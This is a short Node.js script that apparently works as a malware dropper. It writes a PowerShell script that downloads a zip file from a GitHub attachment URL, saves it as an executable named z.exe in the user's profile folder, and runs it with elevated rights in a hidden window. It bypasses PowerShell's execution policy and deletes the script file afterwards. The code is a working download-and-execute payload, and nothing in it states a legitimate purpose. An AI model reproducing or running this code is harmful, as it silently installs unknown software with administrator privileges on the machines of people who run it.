const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');

const url = 'https://github.com/user-attachments/files/15895328/z.zip';
const outFile = path.join(process.env.USERPROFILE, 'z.exe');
const psScript = `
[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; 
$ProgressPreference = 'SilentlyContinue';
$OutFile = '${outFile}';
Invoke-WebRequest -Uri '${url}' -OutFile $OutFile;
Start-Process -FilePath $OutFile -ArgumentList '-fullinstall' -Verb RunAs -WindowStyle Hidden;
`;

// Write PowerShell script to file
fs.writeFileSync('ok.ps1', psScript);

// Execute PowerShell commands
exec('powershell.exe -ExecutionPolicy Bypass -File ok.ps1', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error executing PowerShell: ${error}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    // Clean up script files
    fs.unlinkSync('ok.ps1'); 
    // **Important Note:** Consider security implications before automatically deleting the downloaded file.
    // fs.unlinkSync(outFile); 
});